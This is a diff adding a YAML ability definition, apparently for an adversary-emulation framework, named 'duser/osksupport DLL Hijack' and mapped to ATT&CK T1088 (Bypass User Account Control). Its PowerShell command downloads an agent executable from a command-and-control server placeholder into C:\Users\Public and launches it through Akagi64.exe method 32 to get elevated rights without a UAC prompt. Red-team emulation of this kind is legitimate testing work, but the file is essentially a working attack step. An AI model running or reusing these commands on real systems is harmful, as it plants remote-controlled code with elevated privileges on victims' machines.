@@ -1,0 +1,24 @@
+---
+
+- id: e99cce5c-cb7e-4a6e-8a09-1609a221b90a
+  description: UIPI bypass with uiAccess application
+  name: duser/osksupport DLL Hijack
+  platforms:
+    windows:
+      psh:
+        command: |
+          $url="#{server}/file/download";
+          $wc=New-Object System.Net.WebClient;
+          $wc.Headers.add("platform","windows");
+          $wc.Headers.add("file","sandcat.go");
+          $wc.Headers.add("defaultServer","#{server}");
+          $wc.Headers.add("defaultSleep","60");
+          $wc.Headers.add("defaultGroup","bypassed_u_bro");
+          $output = "C:\Users\Public\sandcatadmin.exe";
+          $wc.DownloadFile($url, $output);
+          .\Akagi64.exe 32 C:\Users\Public\sandcatadmin.exe
+        payload: Akagi64.exe
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1088
+    name: Bypass User Account Control
